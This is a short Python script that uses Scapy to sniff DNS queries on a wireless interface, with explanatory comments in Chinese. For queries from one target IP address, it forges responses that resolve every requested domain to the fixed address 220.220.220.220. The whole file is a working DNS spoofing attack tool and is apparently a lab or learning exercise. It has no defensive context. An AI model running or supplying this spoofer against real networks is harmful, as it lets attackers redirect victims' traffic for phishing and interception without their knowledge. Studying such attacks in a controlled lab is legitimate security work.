
from scapy.all import *
import sys

from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import IP, UDP


# dns包 = IP()/UDP()/DNS(id,qr,opcode,rd，qd=DNSQR(qnname=dns_name), verbose=False) id标识 匹配请求与回应 qr 0表示查询报文 opcode 0表示标准查询 rd 1表示递归

def DNS_Spoof(data):
    try:
        # ip_fields = data.getlayer(IP).fields
        # udp_fields = data.getlayer(UDP).fields
        # dns_fields = data.getlayer(DNS).fields

        #print(ip_fields)
        #print(udp_fields)
        # print(dns_fields)
        req_domain = data[DNS].qd.qname
        print(str(req_domain).split("'")[1])
        print(str(data[IP].src))
        print(str(data[IP].src) == '192.168.31.135')
        print(str(req_domain) == 'www.baidu.com')
        if str(data[IP].src) == '192.168.31.135':
            #if str(req_domain).split("'")[1].find('baidu.com'):
                print(str(req_domain))
                del (data[UDP].len)
                del (data[UDP].chksum)
                del (data[IP].len)
                del (data[IP].chksum)
                res = data.copy()
                res.FCfield = 2
                res.src, res.dst = data.dst, data.src
                res[IP].src, res[IP].dst = data[IP].dst, data[IP].src
                res.sport, res.dport = data.dport, data.sport
                res[DNS].qr = 1
                res[DNS].ra = 1
                res[DNS].ancount = 1
                res[DNS].an = DNSRR(
                    rrname = req_domain,
                    type = 'A',
                    rclass = 'IN',
                    ttl = 900,
                    rdata = '220.220.220.220'
                )
                sendp(res)
        else:
            print('不是目标主机')
    except Exception as e:
        print(e)


def DNS_S(iface):
    sniff(prn=DNS_Spoof,filter='udp dst port 53',iface=iface)


if __name__ == '__main__':
    DNS_S('Realtek 8812BU Wireless LAN 802.11ac USB NIC')